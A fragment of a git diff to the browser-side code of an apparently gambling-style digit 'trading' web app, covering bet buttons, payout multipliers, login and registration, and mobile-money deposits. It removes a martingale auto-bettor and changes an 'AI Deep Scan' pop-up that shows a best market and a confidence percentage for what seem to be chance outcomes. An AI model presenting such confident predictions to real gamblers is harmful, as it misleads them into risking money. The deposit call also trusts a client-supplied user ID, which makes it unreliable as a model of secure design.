           updateBalanceDisplay();
           logTradeResult(data.trade);
-
-          if (autoTraderActive) {
-            if (data.trade.status === 'LOSS') {
-              currentMartingaleStake = Math.min(currentMartingaleStake * 2.0, 100);
-            } else {
-              currentMartingaleStake = baseStake;
-            }
-            document.getElementById('stakeInput').value = currentMartingaleStake;
-            updateCalculations();
-          }
+        }
+      } else if (data.type === 'STK_SUCCESS') {
+        if (currentUser && data.userId === currentUser.id) {
+          currentUser.realBalance = data.realBalance;
+          updateBalanceDisplay();
+          alert(data.message);
         }
       }
     };
@@ -724,19 +636,14 @@ app.get('/', (req, res) => {
       if (type === 'EVEN') {
         targetWrapper.classList.add('hidden');
         actionBox.innerHTML = \`
-          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">EVEN</button>
-          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">ODD</button>
-        \`;
-      } else if (type === 'OVER_UNDER') {
-        targetWrapper.classList.remove('hidden');
-        actionBox.innerHTML = \`
-          <button onclick="executeTradeWithSide('OVER')" class="bg-green-600 hover:bg-green-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">OVER</button>
-          <button onclick="executeTradeWithSide('UNDER')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">UNDER</button>
+          <button onclick="executeTradeWithSide('EVEN')" class="bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase">EVEN</button>
+          <button onclick="executeTradeWithSide('ODD')" class="bg-red-600 hover:bg-red-500 py-3 rounded-lg font-black text-sm uppercase">ODD</button>
         \`;
       } else {
         targetWrapper.classList.remove('hidden');
         actionBox.innerHTML = \`
-          <button onclick="executeTradeWithSide('\${type}')" class="col-span-2 bg-blue-600 hover:bg-blue-500 py-3 rounded-lg font-black text-sm uppercase tracking-wider">PURCHASE CONTRACT</button>
+          <button onclick="executeTradeWithSide('OVER')" class="bg-green-600 hover:bg-green-500 py-3 rounded-lg font-black text-sm uppercase">OVER</button>
+          <button onclick="executeTradeWithSide('UNDER')" class="bg-yellow-600 hover:bg-yellow-500 py-3 rounded-lg font-black text-sm uppercase">UNDER</button>
         \`;
       }
       updateCalculations();
@@ -745,15 +652,14 @@ app.get('/', (req, res) => {
     function updateCalculations() {
       const stake = parseFloat(document.getElementById('stakeInput').value) || 0;
       const type = document.getElementById('tradeTypeSelect').value;
-      const barrier = parseInt(document.getElementById('targetDigitInput').value, 10);
-      let multiplier = 0.80;
+      const digit = parseInt(document.getElementById('targetDigitInput').value, 10);
+      let multiplier = 0.80; // Default EVEN/ODD 80%
 
       if (type === 'OVER_UNDER') {
-        if (barrier >= 3 && barrier <= 6) multiplier = 0.50;
-        else if (barrier === 1 || barrier === 9) multiplier = 0.30;
-        else multiplier = 0.40;
-      } else if (type === 'MATCH_DIGIT') multiplier = 8.50;
-      else if (type === 'DIFF_DIGIT') multiplier = 0.09;
+        if (digit === 1 || digit === 9) multiplier = 0.30;
+        else if (digit >= 3 && digit <= 6) multiplier = 0.50;
+        else multiplier = 0.50;
+      }
 
       const payout = stake + (stake * multiplier);
       document.getElementById('summaryStake').innerText = '$' + stake.toFixed(2);
@@ -787,26 +693,6 @@ app.get('/', (req, res) => {
       updateBalanceDisplay();
     }
 
-    function toggleAutoTrader() {
-      autoTraderActive = !autoTraderActive;
-      const btn = document.getElementById('autoTraderBtn');
-      if (autoTraderActive) {
-        btn.innerText = "STOP AUTO";
-        btn.className = "bg-red-600 hover:bg-red-500 text-white font-bold text-xs px-3 py-1 rounded-lg";
-        baseStake = parseFloat(document.getElementById('stakeInput').value) || 5;
-        currentMartingaleStake = baseStake;
-
-        autoTraderTimer = setInterval(() => {
-          if (!autoTraderActive) return;
-          executeTradeWithSide('EVEN');
-        }, 3000);
-      } else {
-        btn.innerText = "START AUTO";
-        btn.className = "bg-purple-600 hover:bg-purple-500 text-white font-bold text-xs px-3 py-1 rounded-lg";
-        clearInterval(autoTraderTimer);
-      }
-    }
-
     function logTradeResult(trade) {
       const log = document.getElementById('tradesLog');
       const item = document.createElement('div');
@@ -814,7 +700,7 @@ app.get('/', (req, res) => {
       item.innerHTML = \`
         <div class="flex justify-between font-bold">
           <span>\${trade.symbolName} (\${trade.tradeType})</span>
-          <span class="\${trade.status === 'WIN' ? 'text-green-400' : 'text-red-400'}">\${trade.status} ($\${trade.payout.toFixed(2)})</span>
+          <span class="\${trade.status === 'WIN' ? 'text-green-400' : 'text-red-400'}">\${trade.status} (\$\${trade.payout.toFixed(2)})</span>
         </div>
         <div class="text-[10px] text-gray-500 mt-1">
           Entry: \${trade.entryPrice} | Exit: \${trade.exitPrice}
@@ -825,36 +711,32 @@ app.get('/', (req, res) => {
 
     function toggleAuthMode() {
       authMode = (authMode === 'LOGIN') ? 'REGISTER' : 'LOGIN';
-      document.getElementById('authTitle').innerText = authMode === 'REGISTER' ? 'CREATE WORKSTATION ACCOUNT' : 'WORKSTATION LOGIN';
+      document.getElementById('authTitle').innerText = authMode === 'REGISTER' ? 'CREATE WORKSTATION ACCOUNT' : 'TRADERSCHEME LOGIN';
       document.getElementById('authSubmitBtn').innerText = authMode === 'REGISTER' ? 'Register Account' : 'Log In';
       document.getElementById('authToggleBtn').innerText = authMode === 'REGISTER' ? 'Already have an account? Login' : 'Need an account? Register';
       
-      if (authMode === 'REGISTER') document.getElementById('mobileWrapper').classList.remove('hidden');
-      else document.getElementById('mobileWrapper').classList.add('hidden');
+      if (authMode === 'REGISTER') document.getElementById('mobileFieldWrapper').classList.remove('hidden');
+      else document.getElementById('mobileFieldWrapper').classList.add('hidden');
     }
 
     async function submitAuth() {
       const email = document.getElementById('authEmail').value.trim();
+      const mobile = document.getElementById('authMobile').value.trim();
       const password = document.getElementById('authPassword').value.trim();
-      const mobileNumber = document.getElementById('authMobile').value.trim();
-
-      if (!email || !password) return alert("Please enter required credentials.");
-      if (authMode === 'REGISTER' && !mobileNumber) return alert("Mobile number is required for registration.");
 
       const endpoint = authMode === 'REGISTER' ? '/api/auth/register' : '/api/auth/login';
+      const bodyPayload = authMode === 'REGISTER' ? { email, mobile, password } : { email, password };
+
       const res = await fetch(endpoint, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email, password, mobileNumber })
+        body: JSON.stringify(bodyPayload)
       });
 
       const data = await res.json();
       if (data.error) return alert(data.error);
 
       currentUser = data.user;
-      if (ws.readyState === WebSocket.OPEN) {
-        ws.send(JSON.stringify({ type: 'IDENTIFY', userId: currentUser.id }));
-      }
       updateBalanceDisplay();
       document.getElementById('authModal').classList.add('hidden');
     }
@@ -863,22 +745,23 @@ app.get('/', (req, res) => {
       const res = await fetch('/api/ai/deep-scan');
       const data = await res.json();
       if (data.success) {
-        const m = data.bestMarket;
-        alert(\`AI Deep Scan Complete!\nBest Market: \${m.name}\nRecommendation: \${m.targetMarket} (\${m.recommendedType})\nConfidence: \${m.score}%\`);
+        alert(\`AI Scan Analysis Complete!\n\nBest Market: \${data.recommendation.name}\nRecommended Option: \${data.recommendation.bestContract}\nConfidence Rate: \${data.recommendation.confidence}%\`);
       }
     }
 
     function openDepositModal() {
       if (!currentUser) return alert("Please log in first.");
-      document.getElementById('depositMobileDisplay').value = currentUser.mobileNumber;
+      document.getElementById('depositMobileDisplay').value = currentUser.mobile || "No number registered";
       document.getElementById('depositModal').classList.remove('hidden');
     }
+    
+    function closeDepositModal() {
+      document.getElementById('depositModal').classList.add('hidden');
+    }
 
-    function closeDepositModal() { document.getElementById('depositModal').classList.add('hidden'); }
-
-    async function processStkDeposit() {
+    async function processStkPushDeposit() {
       const amount = document.getElementById('depositAmount').value;
-      const res = await fetch('/api/wallet/deposit/stkpush', {
+      const res = await fetch('/api/wallet/stk-push', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ userId: currentUser.id, amount })
@@ -887,8 +770,6 @@ app.get('/', (req, res) => {
       const data = await res.json();
       if (data.error) return alert(data.error);
 
-      currentUser.realBalance = data.realBalance;
-      setAccountType('REAL');
       alert(data.message);
       closeDepositModal();
     }
